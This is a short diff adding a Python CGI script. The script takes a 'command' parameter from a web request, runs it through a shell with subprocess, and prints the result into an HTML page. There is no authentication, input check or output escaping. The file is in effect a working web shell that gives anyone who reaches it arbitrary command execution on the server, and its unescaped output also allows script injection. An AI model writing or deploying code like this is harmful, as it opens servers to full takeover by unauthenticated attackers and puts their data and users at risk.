@@ -1,0 +1,15 @@
+#!/usr/bin/python3
+
+import cgi
+import subprocess as sub
+
+print("content-type: text/html")
+print()
+
+x=cgi.FieldStorage()
+y=x.getvalue("command")
+t=sub.getstatusoutput(y)
+if t[0] == 0:
+  print("<h1>"+t[1]+"</h1>")
+else:
+  print("Command Not Found")
